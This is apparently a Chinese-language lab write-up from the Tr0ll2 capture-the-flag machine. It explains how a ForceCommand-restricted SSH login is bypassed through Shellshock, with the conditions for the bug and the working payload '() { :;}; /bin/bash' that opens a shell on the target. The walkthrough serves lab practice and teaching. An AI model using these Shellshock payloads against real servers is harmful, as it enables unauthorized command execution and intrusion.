在打靶机Tr0ll2时遇到了这个问题
```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ ssh -i noob Tr0ll@192.168.10.8 -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss
Tr0ll@192.168.10.8's password: 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/
New release '14.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Mar 17 00:14:01 2024 from 192.168.10.3
Connection to 192.168.10.8 closed.
```
其实不能放到LPE这个板块
但是既然是shellshock，也没地方放了

遇到的问题就是得到了私钥结果无法登录，一连就断

## 简介
OpenSSH支持阻止SSH客户端运行命令并生成交互式登录 shell。但是，如果相应的 SSH 服务器容易受到Shellshock的攻击，则客户端可以通过利用该错误并在客户端用户权限内运行任何命令来绕过此限制。

```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ ssh -i noob Tr0ll@192.168.10.8 'echo hello' 
sign_and_send_pubkey: no mutual signature supported
Tr0ll@192.168.10.8's password: 
                                                                                                                                                                                           
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ ssh -i noob Tr0ll@192.168.10.8             
sign_and_send_pubkey: no mutual signature supported
Tr0ll@192.168.10.8's password: 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/
New release '14.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Mar 17 00:14:34 2024 from 192.168.10.3
Connection to 192.168.10.8 closed.
```

通过上面的命令可以发现，虽然用户无法访问交互式 shell
如果它们提供与ssh命令一起运行的命令，sshd会将其复制到SSH_ORIGINAL_COMMAND变量中，但仅运行强制命令
这里运行了echo命令，打断了后面的ssh，所以没有welcome信息了

这里就产生了rce

## 如何通过 SSH 利用 Shellshock

要成功通过 SSH 进行 Shellshock 攻击，必须满足某些条件：

服务器有一个易受攻击的 Bash 版本
客户端有一个有效的SSH 密钥
客户端用户的登录 shell指向相同的易受攻击的 Bash；否则，使用不易受攻击的 Bash 版本或使用不同的 shell 作为登录 shell（例如zsh）不会导致漏洞利用
服务器使用ForceCommand或命令指令限制用户的 SSH 访问，如前所述；否则，用户可以直接登录访问交互式 shell

```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ ssh -i noob noob@192.168.10.8 -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss '() { :;}; echo USER=$USER and SHELL=$SHELL'
USER=noob and SHELL=/bin/bash
TRY HARDER LOL!

┌──(kali㉿kali)-[~/workspace/troll2]
└─$ ssh -i noob noob@192.168.10.8 -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss '() { :;}; /bin/bash'                       
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
```
